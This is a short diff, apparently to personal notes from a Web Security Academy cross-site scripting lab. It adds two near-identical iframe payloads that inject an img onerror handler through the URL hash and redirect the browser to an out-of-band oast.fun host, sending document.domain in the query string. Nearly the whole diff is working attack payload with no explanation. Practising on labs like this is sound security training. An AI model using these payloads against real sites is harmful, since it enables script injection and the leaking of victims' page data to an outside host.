@@ -22,3 +22,12 @@ ___
 javascript:alert(1)
 ```
 
+```html
+<iframe src="https://0a190064039da4c7853828e6009e004c.web-security-academy.net/#" onload="this.src+='<img src=x onerror=location='http://tqppomndoggvfeiefwpdh4jb599h3e07m.oast.fun/?c='+document.domain;>'"></iframe>
+```
+
+
+```html
+<iframe src="https://0a190064039da4c7853828e6009e004c.web-security-academy.net/#" onload="this.src+='<img src=x onerror=location='http://tqppomndoggvfeiefwpdh4jb599h3e07m.oast.fun/?c='+document.domain>'"></iframe>
+```
+
